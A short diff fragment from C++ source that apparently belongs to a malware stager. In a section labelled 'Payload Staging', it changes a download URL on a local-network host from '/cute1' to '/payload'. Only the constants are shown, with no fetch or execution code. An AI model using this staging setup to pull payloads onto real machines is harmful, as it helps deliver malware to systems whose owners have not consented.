@@ -9,7 +9,7 @@ using namespace std;
 
 // --Payload Staging--
 #define NUM_VARIABLES 4 // Number of different variables to process
-#define FILE_URL "http://192.168.153.136:8080/cute1" // URL of the file to be downloaded
+#define FILE_URL "http://192.168.153.136:8080/payload" // URL of the file to be downloaded
 #define DELIMITER "-" // Delimiter to be used
 
 // Order Values
